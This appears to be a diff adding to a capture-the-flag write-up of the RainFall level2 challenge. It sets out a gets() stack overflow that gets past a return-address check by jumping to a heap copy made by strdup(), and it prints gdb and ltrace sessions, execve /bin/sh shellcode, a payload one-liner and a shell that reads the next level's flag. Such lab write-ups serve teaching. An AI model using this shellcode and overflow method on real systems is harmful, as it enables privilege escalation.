@@ -147,3 +147,144 @@ The program implements a **return address validation** mechanism!
 - **Security violation**: If return address starts with 0xb, print error and exit
 - **Normal execution**: Echo input with puts(), then call strdup()
 - **strdup() call**: Creates heap copy of our input - **KEY EXPLOITATION VECTOR!**
+
+## Understanding the Security Mechanism
+
+### 7. Return Address Validation Logic
+```bash
+# Let's understand what addresses are blocked:
+(gdb) print/x 0xbfffffff & 0xb0000000
+$1 = 0xb0000000  # Stack addresses BLOCKED
+
+(gdb) print/x 0x08048000 & 0xb0000000  
+$2 = 0x0        # Code section addresses ALLOWED
+
+(gdb) print/x 0x0804a000 & 0xb0000000
+$3 = 0x0        # Heap addresses ALLOWED
+```
+
+**Security Check Analysis:**
+- **Stack addresses (0xbf000000-0xbfffffff)**: BLOCKED ❌
+- **Heap addresses (0x08040000-0x0804ffff)**: ALLOWED ✅  
+- **Code section (0x08048000-0x08049fff)**: ALLOWED ✅
+
+**The Bypass Strategy Emerges:**
+We can't use stack addresses, but we CAN use heap addresses! The strdup() call gives us a heap allocation with our controlled data.
+
+### 8. Finding the Buffer Overflow Offset
+```bash
+level2@RainFall:~$ gdb level2
+(gdb) run
+Starting program: /home/user/level2/level2
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+# Analyzing the crash address
+(gdb) print 0x37634136
+$1 = 929251638
+# This is "6Ac7" in little-endian
+
+# Finding the position in our De Bruijn sequence
+# "6Ac7" appears at position 80 in the pattern
+```
+
+**Offset Discovery:**
+- **Buffer overflow offset**: 80 bytes
+- **Return address location**: After 80 bytes of input
+- **Crash confirmation**: Program tries to execute 0x37634136 ("6Ac7")
+
+## Heap Address Discovery and Exploitation Strategy
+
+### 9. Finding the Heap Allocation Address
+```bash
+level2@RainFall:~$ ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20) = 0
+gets(0xbffff71c)  = 0xbffff71c
+TEST
+puts("TEST") = 5
+strdup("TEST")  = 0x804a008
++++ exited (status 0) +++
+```
+
+**Heap Address Discovery:**
+- **strdup() allocation**: Returns 0x804a008
+- **Predictable address**: Heap allocations are consistent
+- **Security check bypass**: 0x804a008 & 0xb0000000 = 0 ✅
+
+**Exploitation Plan:**
+1. **Place shellcode** at beginning of input
+2. **Add padding** to reach return address (80 bytes total)  
+3. **Overwrite return address** with heap address (0x804a008)
+4. **strdup() copies shellcode** to heap at known address
+5. **Function return** jumps to heap shellcode
+6. **Shell execution** with elevated privileges
+
+### 10. Crafting the Shellcode
+```bash
+# Compact shellcode for /bin/sh execution (21 bytes):
+shellcode = (
+    "\x6a\x0b"                    # push 0xb (execve syscall)
+    "\x58"                        # pop eax
+    "\x99"                        # cdq (clear edx)
+    "\x52"                        # push edx (NULL terminator)
+    "\x68\x2f\x2f\x73\x68"        # push "//sh"
+    "\x68\x2f\x62\x69\x6e"        # push "/bin"
+    "\x89\xe3"                    # mov ebx, esp ("/bin//sh")
+    "\x31\xc9"                    # xor ecx, ecx (argv = NULL)
+    "\xcd\x80"                    # int 0x80 (syscall)
+)
+
+# Shellcode breakdown:
+# 1. Set up execve syscall number (11) in EAX
+# 2. Clear EDX for environment pointer
+# 3. Push "/bin//sh" string onto stack
+# 4. Set EBX to point to filename
+# 5. Clear ECX for argv pointer  
+# 6. Execute system call
+```
+
+### 11. Payload Construction
+```bash
+# Payload structure:
+# [21 bytes shellcode] + [59 bytes padding] + [4 bytes heap address]
+# Total: 80 bytes to reach return address + 4 bytes return address
+
+# Memory layout after gets():
+# Buffer[0-20]:   Shellcode
+# Buffer[21-79]:  Padding ("A" characters)
+# Return address: 0x0804a008 (heap address where strdup copies our data)
+
+# Creating the payload:
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"' > /tmp/payload2
+```
+
+**Payload Logic:**
+1. **Shellcode placement**: First 21 bytes contain our shell execution code
+2. **Padding calculation**: 80 - 21 = 59 bytes needed to reach return address
+3. **Return address**: 0x0804a008 in little-endian format (\x08\xa0\x04\x08)
+4. **gets() overflow**: Corrupts return address on stack
+5. **strdup() allocation**: Copies entire payload (including shellcode) to heap
+6. **Function return**: Jumps to heap address, executes shellcode
+
+## Exploitation Implementation
+
+### 12. Testing the Exploit
+```bash
+level2@RainFall:~$ (cat /tmp/payload2; cat) | ./level2
+# Program executes, processes input, calls strdup(), then returns...
+$ whoami
+level3
+$ cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
+**Success!**
+1. **gets() overflow**: 84-byte payload overflows buffer and corrupts return address
+2. **Security check bypass**: Return address 0x0804a008 passes validation (not 0xb...)
+3. **Normal execution**: puts() echoes input, strdup() copies to heap
+4. **Heap shellcode**: strdup() places our shellcode at 0x0804a008
+5. **Control transfer**: Function return jumps to heap address
+6. **Shellcode execution**: /bin/sh spawned with level3 privileges
